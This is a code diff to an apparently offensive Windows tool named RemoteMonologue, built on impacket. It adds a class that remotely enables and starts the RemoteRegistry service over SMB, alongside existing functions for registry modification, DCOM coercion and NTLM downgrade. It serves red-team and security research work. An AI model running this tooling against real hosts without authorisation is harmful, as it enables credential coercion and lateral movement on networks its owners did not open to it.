@@ -25,7 +25,7 @@ from impacket.krb5.keytab import Keytab
 from impacket.dcerpc.v5.transport import DCERPCTransportFactory
 from impacket.dcerpc.v5 import transport, rrp, scmr,lsat, lsad
 from impacket.dcerpc.v5.ndr import NULL
-from impacket.smbconnection import SMBConnection
+from impacket.smbconnection import SMBConnection, SessionError
 from impacket.smb3structs import *
 from impacket.dcerpc.v5 import transport, rrp, scmr
 from impacket.dcerpc.v5.samr import SID_NAME_USE
@@ -37,6 +37,91 @@ text_blue = '\033[36m'
 text_yellow = '\033[93m'
 text_red = '\033[91m'
 text_end = '\033[0m'
+
+# copy-pasta from impacket reg.py
+class RemoteOperations:
+    def __init__(self, smbConnection):
+        self.__smbConnection = smbConnection
+        self.__smbConnection.setTimeout(5 * 60)
+        self.__serviceName = 'RemoteRegistry'
+        self.__stringBindingWinReg = r'ncacn_np:445[\pipe\winreg]'
+        self.__rrp = None
+
+        self.__disabled = False
+        self.__shouldStop = False
+        self.__started = False
+
+        self.__stringBindingSvcCtl = r'ncacn_np:445[\pipe\svcctl]'
+        self.__scmr = None
+
+    def getRRP(self):
+        return self.__rrp
+
+    def __connectSvcCtl(self):
+        rpc = transport.DCERPCTransportFactory(self.__stringBindingSvcCtl)
+        rpc.set_smb_connection(self.__smbConnection)
+        self.__scmr = rpc.get_dce_rpc()
+        self.__scmr.connect()
+        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
+
+    def connectWinReg(self):
+        rpc = transport.DCERPCTransportFactory(self.__stringBindingWinReg)
+        rpc.set_smb_connection(self.__smbConnection)
+        self.__rrp = rpc.get_dce_rpc()
+        self.__rrp.connect()
+        self.__rrp.bind(rrp.MSRPC_UUID_RRP)
+
+    def __checkServiceStatus(self):
+        # Open SC Manager
+        ans = scmr.hROpenSCManagerW(self.__scmr)
+        self.__scManagerHandle = ans['lpScHandle']
+        # Now let's open the service
+        ans = scmr.hROpenServiceW(self.__scmr, self.__scManagerHandle, self.__serviceName)
+        self.__serviceHandle = ans['lpServiceHandle']
+        # Let's check its status
+        ans = scmr.hRQueryServiceStatus(self.__scmr, self.__serviceHandle)
+        if ans['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_STOPPED:
+            logging.info('Service %s is in stopped state' % self.__serviceName)
+            self.__shouldStop = True
+            self.__started = False
+        elif ans['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_RUNNING:
+            logging.debug('Service %s is already running' % self.__serviceName)
+            self.__shouldStop = False
+            self.__started = True
+        else:
+            raise Exception('Unknown service state 0x%x - Aborting' % ans['CurrentState'])
+
+        # Let's check its configuration if service is stopped, maybe it's disabled :s
+        if self.__started is False:
+            ans = scmr.hRQueryServiceConfigW(self.__scmr, self.__serviceHandle)
+            if ans['lpServiceConfig']['dwStartType'] == 0x4:
+                logging.info('Service %s is disabled, enabling it' % self.__serviceName)
+                self.__disabled = True
+                scmr.hRChangeServiceConfigW(self.__scmr, self.__serviceHandle, dwStartType=0x3)
+            logging.info('Starting service %s' % self.__serviceName)
+            scmr.hRStartServiceW(self.__scmr, self.__serviceHandle)
+            time.sleep(1)
+
+    def enableRegistry(self):
+        self.__connectSvcCtl()
+        self.__checkServiceStatus()
+        self.connectWinReg()
+
+    def __restore(self):
+        # First of all stop the service if it was originally stopped
+        if self.__shouldStop is True:
+            logging.info('Stopping service %s' % self.__serviceName)
+            scmr.hRControlService(self.__scmr, self.__serviceHandle, scmr.SERVICE_CONTROL_STOP)
+        if self.__disabled is True:
+            logging.info('Restoring the disabled state for service %s' % self.__serviceName)
+            scmr.hRChangeServiceConfigW(self.__scmr, self.__serviceHandle, dwStartType=0x4)
+
+    def finish(self):
+        self.__restore()
+        if self.__rrp is not None:
+            self.__rrp.disconnect()
+        if self.__scmr is not None:
+            self.__scmr.disconnect()
 
 class RemoteMonologue:
     def __init__(self, username='', password='', domain='', address='', hashes=None, aesKey=None,
@@ -56,8 +141,16 @@ class RemoteMonologue:
         self.__dcom = dcom
         self.__downgrade = downgrade
         self.__webclient = webclient
+        self.remoteregistry = None
         if hashes is not None:
             self.__lmhash, self.__nthash = hashes.split(':')
+
+        self.__smbclient = SMBConnection(self.__address, self.__address)
+        if options.k is True:
+            self.__smbclient.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, options.dc_ip )
+        else:
+            self.__smbclient.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
+
 
     def getInterface(self, interface, resp):
         # Now let's parse the answer and build an Interface instance
@@ -123,38 +216,8 @@ class RemoteMonologue:
             if not self.__webclient:
                 if not self.checkSMB():
                     return
-          
-            smbclient = SMBConnection(self.__address, self.__address)
 
-            if options.k is True:
-                smbclient.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, options.dc_ip )
-            else:
-                smbclient.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
-
-
-            for attempt in range(3):
-                try:
-                    string_binding = r'ncacn_np:%s[\pipe\winreg]'
-                    rpc = transport.DCERPCTransportFactory(string_binding)
-                    rpc.set_smb_connection(smbclient)
-                    dce = rpc.get_dce_rpc()
-                    dce.connect()
-                    logging.debug("Connected to RemoteRegistry!")
-                    break
-                except (Exception) as e:
-                    if str(e).find("STATUS_PIPE_NOT_AVAILABLE") >= 0:
-                        logging.debug("STATUS_PIPE_NOT_AVAILABLE. Retrying in 0.5 seconds...")
-                        time.sleep(0.5)
-                    else:
-                        logging.error("Failed to connect to RemoteRegistry:", e)
-                        if self.__output != None:
-                            output_file = open(self.__output, "a")
-                            output_file.write("[-] Failed to connect to RemoteRegistry," + self.__address + "\n")
-                            output_file.close()
-                        return
-
-        
-        dce.bind(rrp.MSRPC_UUID_RRP)
+        dce = self.remoteRegistry.getRRP()
 
         reg_handle = rrp.hOpenLocalMachine(dce)
 
@@ -411,8 +474,6 @@ class RemoteMonologue:
 
         rrp.hBaseRegCloseKey(dce, reg_handle["phKey"])
         
-        dce.disconnect()
-        
 
     def hBaseRegSetKeySecurity(self, dce, hKey, pRpcSecurityDescriptor, securityInformation = scmr.OWNER_SECURITY_INFORMATION):
         # Thank you @skelsec
@@ -562,18 +623,11 @@ class RemoteMonologue:
                 index += 1
             except:
                 break
-        
-
-        smbclient = SMBConnection(self.__address, self.__address)
-        if options.k is True:
-            smbclient.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, options.dc_ip )
-        else:
-            smbclient.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
 
 
         lsaRpcBinding = r'ncacn_np:%s[\pipe\lsarpc]'
         rpc = transport.DCERPCTransportFactory(lsaRpcBinding)
-        rpc.set_smb_connection(smbclient)
+        rpc.set_smb_connection(self.__smbclient)
         dce = rpc.get_dce_rpc()
         dce.connect()
         
@@ -602,18 +656,21 @@ class RemoteMonologue:
 
 
     def run(self):
+        self.remoteRegistry = RemoteOperations(self.__smbclient)
+        self.remoteRegistry.enableRegistry()
 
         if self.__webclient:
             self.enableWebclient()
-            return
-
-        if (self.__dcom == "UpdateSession" and self.__downgrade):
-            self.registry_modifications()
-        elif (self.__dcom == "UpdateSession"):
-            logging.info("Targeting UpdateSession COM object")
-            self.dcom_coerce()
         else:
-            self.registry_modifications()
+            if (self.__dcom == "UpdateSession" and self.__downgrade):
+                self.registry_modifications()
+            elif (self.__dcom == "UpdateSession"):
+                logging.info("Targeting UpdateSession COM object")
+                self.dcom_coerce()
+            else:
+                self.registry_modifications()
+
+        self.remoteRegistry.finish()
 
 
     def dcom_coerce(self):
